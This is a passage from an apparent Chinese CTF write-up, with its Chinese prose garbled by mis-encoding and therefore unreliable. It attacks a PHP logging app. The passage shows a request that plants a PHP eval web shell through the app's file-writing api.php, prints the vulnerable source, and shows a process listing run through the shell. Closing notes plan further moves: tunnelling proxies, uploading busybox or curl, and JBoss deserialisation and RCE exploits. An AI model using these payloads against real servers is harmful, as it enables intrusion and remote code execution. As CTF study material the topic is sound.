header-value">http://8.147.132.101:30721/</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36</span></span><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://8.147.132.101:30721</span></span><span class="token header"><span class="token header-name keyword">Pragma</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">10</span></span>content=&lt;?php eval($_POST[0]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>api.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$queryString</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$queryString</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æœªæ£€æµ‹åˆ°ä»»ä½• GET å‚æ•°ã€‚"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$queryString</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"éæ³•è¯·æ±‚ï¼šGET å‚æ•°ä¸­ä¸å…è®¸åŒ…å« '%' å­—ç¬¦ã€‚"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$params</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span> <span class="token variable">$queryString</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$expectedOrder</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'timestamp[year]'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'timestamp[month]'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'timestamp[day]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$foundKeys</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$duplicates</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$values</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$param</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$parts</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'='</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^timestamp\[[a-zA-Z]+\]$/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$foundKeys</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$duplicates</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$foundKeys</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$values</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$missing</span> <span class="token operator">=</span> <span class="token function">array_diff</span><span class="token punctuation">(</span><span class="token variable">$expectedOrder</span><span class="token punctuation">,</span> <span class="token variable">$foundKeys</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$extra</span>   <span class="token operator">=</span> <span class="token function">array_diff</span><span class="token punctuation">(</span><span class="token variable">$foundKeys</span><span class="token punctuation">,</span> <span class="token variable">$expectedOrder</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$duplicates</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æ£€æµ‹åˆ°é‡å¤çš„å‚æ•°ï¼š"</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">', '</span><span class="token punctuation">,</span> <span class="token function">array_unique</span><span class="token punctuation">(</span><span class="token variable">$duplicates</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$missing</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ç¼ºå°‘å‚æ•°ï¼š"</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">', '</span><span class="token punctuation">,</span> <span class="token variable">$missing</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extra</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å«æœ‰å¤šä½™å‚æ•°ï¼š"</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">', '</span><span class="token punctuation">,</span> <span class="token variable">$extra</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$foundKeys</span> <span class="token operator">!==</span> <span class="token variable">$expectedOrder</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å‚æ•°é¡ºåºé”™è¯¯ï¼Œåº”ä¸ºï¼š"</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' â†’ '</span><span class="token punctuation">,</span> <span class="token variable">$expectedOrder</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"ã€‚å½“å‰ä¸ºï¼š"</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">', '</span><span class="token punctuation">,</span> <span class="token variable">$foundKeys</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$expectedOrder</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$values</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">ctype_digit</span><span class="token punctuation">(</span><span class="token variable">$values</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å‚æ•° <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">&#125;</span></span> å¿…é¡»ä¸ºçº¯æ•°å­—ï¼Œå½“å‰ä¸ºï¼š"</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token variable">$values</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">'æœªæä¾›'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æœªæ£€æµ‹åˆ° POST å†…å®¹ï¼ˆcontentï¼‰ã€‚"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/upload'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$year</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'timestamp'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'year'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$month</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'timestamp'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'month'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$day</span>   <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'timestamp'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'day'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$year</span><span class="token operator">.</span><span class="token variable">$month</span><span class="token operator">.</span><span class="token variable">$day</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">,</span> <span class="token class-name">FILE_APPEND</span> <span class="token operator">|</span> <span class="token class-name">LOCK_EX</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å†™å…¥æ–‡ä»¶å¤±è´¥"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ—¥å¿—ä¿å­˜æˆåŠŸ"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// è‡ªåŠ¨è·å–å½“å‰ç³»ç»Ÿæ—¥æœŸ</span><span class="token variable">$year</span>  <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$month</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$day</span>   <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'j'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ‹¼æ¥ç›®æ ‡ URLï¼ˆå¸¦ GET å‚æ•°ï¼‰</span><span class="token variable">$apiUrl</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span>    <span class="token string double-quoted-string">"api.php?timestamp[year]=%s&amp;timestamp[month]=%s&amp;timestamp[day]=%s"</span><span class="token punctuation">,</span>    <span class="token variable">$year</span><span class="token punctuation">,</span> <span class="token variable">$month</span><span class="token punctuation">,</span> <span class="token variable">$day</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh-CN<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>æ—¥å¿—è¾“å…¥<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><span class="token selector">body</span> <span class="token punctuation">&#123;</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"Microsoft Yahei"</span><span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>    <span class="token property">background</span><span class="token punctuation">:</span> #f7f7f7<span class="token punctuation">;</span>    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>    <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span>    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>    <span class="token property">padding-top</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">h2</span> <span class="token punctuation">&#123;</span> <span class="token property">color</span><span class="token punctuation">:</span> #333<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token selector">form</span> <span class="token punctuation">&#123;</span>    <span class="token property">background</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>    <span class="token property">padding</span><span class="token punctuation">:</span> 20px 30px<span class="token punctuation">;</span>    <span class="token property">border-radius</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>    <span class="token property">box-shadow</span><span class="token punctuation">:</span> 0 2px 6px <span class="token function">rgba</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0.1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">width</span><span class="token punctuation">:</span> 400px<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">textarea</span> <span class="token punctuation">&#123;</span>    <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> 150px<span class="token punctuation">;</span>    <span class="token property">font-size</span><span class="token punctuation">:</span> 14px<span class="token punctuation">;</span>    <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>    <span class="token property">resize</span><span class="token punctuation">:</span> vertical<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">button</span> <span class="token punctuation">&#123;</span>    <span class="token property">margin-top</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>    <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>    <span class="token property">background</span><span class="token punctuation">:</span> #007BFF<span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>    <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>    <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>    <span class="token property">border-radius</span><span class="token punctuation">:</span> 6px<span class="token punctuation">;</span>    <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">button:hover</span> <span class="token punctuation">&#123;</span>    <span class="token property">background</span><span class="token punctuation">:</span> #0056b3<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>ğŸ“ ä»Šæ—¥æ—¥å¿—è¾“å…¥<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$apiUrl</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>è¯·è¾“å…¥ä»Šæ—¥å†…å®¹...<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æäº¤æ—¥å¿—<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿›ç¨‹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token environment constant">UID</span> PID <span class="token environment constant">PPID</span> C STIME TTY TIME CMDroot <span class="token number">1</span> <span class="token number">0</span> <span class="token number">0</span> 04:17 pts/0 00:00:00 <span class="token function">tail</span> <span class="token parameter variable">-f</span> /dev/nullroot <span class="token number">77</span> <span class="token number">1</span> <span class="token number">0</span> 04:17 ? 00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data <span class="token number">82</span> <span class="token number">77</span> <span class="token number">0</span> 04:17 ? 00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data <span class="token number">83</span> <span class="token number">77</span> <span class="token number">0</span> 04:17 ? 00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data <span class="token number">84</span> <span class="token number">77</span> <span class="token number">0</span> 04:17 ? 00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data <span class="token number">85</span> <span class="token number">77</span> <span class="token number">0</span> 04:17 ? 00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data <span class="token number">86</span> <span class="token number">77</span> <span class="token number">0</span> 04:17 ? 00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startroot <span class="token number">90</span> <span class="token number">1</span> <span class="token number">0</span> 04:17 pts/0 00:00:00 /bin/sh /opt/jboss-4.2.3.GA/bin/run.sh <span class="token parameter variable">-b</span> <span class="token number">0.0</span>.0.0root <span class="token number">111</span> <span class="token number">90</span> <span class="token number">0</span> 04:17 pts/0 00:00:04 <span class="token function">java</span> <span class="token parameter variable">-Dprogram.name</span><span class="token operator">=</span>run.sh <span class="token parameter variable">-Xms128m</span> <span class="token parameter variable">-Xmx512m</span> <span class="token parameter variable">-Dsun.rmi.dgc.client.gcInterval</span><span class="token operator">=</span><span class="token number">3600000</span> <span class="token parameter variable">-Dsun.rmi.dgc.server.gcInterval</span><span class="token operator">=</span><span class="token number">3600000</span> <span class="token parameter variable">-Djava.net.preferIPv4Stack</span><span class="token operator">=</span>true <span class="token parameter variable">-Djava.endorsed.dirs</span><span class="token operator">=</span>/opt/jboss-4.2.3.GA/lib/endorsed <span class="token parameter variable">-classpath</span> /opt/jboss-4.2.3.GA/bin/run.jar org.jboss.Main <span class="token parameter variable">-b</span> <span class="token number">0.0</span>.0.0www-data <span class="token number">140</span> <span class="token number">77</span> <span class="token number">0</span> 04:17 ? 00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data <span class="token number">141</span> <span class="token number">77</span> <span class="token number">0</span> 04:17 ? 00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data <span class="token number">142</span> <span class="token number">77</span> <span class="token number">0</span> 04:18 ? 00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data <span class="token number">143</span> <span class="token number">77</span> <span class="token number">0</span> 04:18 ? 00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data <span class="token number">144</span> <span class="token number">77</span> <span class="token number">0</span> 04:18 ? 00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data <span class="token number">192</span> <span class="token number">141</span> <span class="token number">0</span> 04:37 ? 00:00:00 <span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token function">ps</span> <span class="token parameter variable">-ef</span>www-data <span class="token number">193</span> <span class="token number">192</span> <span class="token number">0</span> 04:37 ? 00:00:00 <span class="token function">ps</span> <span class="token parameter variable">-ef</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¼€äº†ä¸ª jbossï¼Œå¼€äº† 8083ã€1099ã€4446 ç«¯å£</p><p>ä¸å‡ºç½‘ï¼Œå…ˆå°è¯•åš neo æ­£å‘ä»£ç†ï¼Œä½†æ˜¯å¯èƒ½æ˜¯ apache çš„é—®é¢˜ä¸€ç›´è¿ä¸ä¸Šï¼Œåé¢çœ‹åˆ«çš„é˜Ÿæœ‰ç”¨ suo5 çš„</p><p>è¿™é‡Œè€ƒè™‘ç›´æ¥ä¼  busybox æˆ–è€…ç¼–è¯‘ä¸€ä¸ª curl ä¼ ä¸Šå»</p><p>curl 8083 ç«¯å£å‘ç°è¿”å› 404ï¼Œdump ä¸€ä¸‹ jboss åŒ…åˆ°æœ¬åœ°èµ·å‘ç° jboss-4.2.3.GA/server/default/deploy/ ç›®å½•ä¸å­˜åœ¨ï¼Œä¹Ÿå°±æ˜¯æ²¡èµ· web æœåŠ¡ï¼Œä¸èƒ½æ‰“ <a href="http://www.bmth666.cn/2023/02/21/JBoss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">jboss ååºåˆ—åŒ– CVE-2017-7504</a></p><p>ä½†æ˜¯æ²¡æ³¨æ„åˆ°ä¸‹é¢è¿˜æœ‰ä¸ª JBoss EAP&#x2F;AS &lt;&#x3D; 6.* RCE èƒ½æ‰“</p>]]></content>
    
    
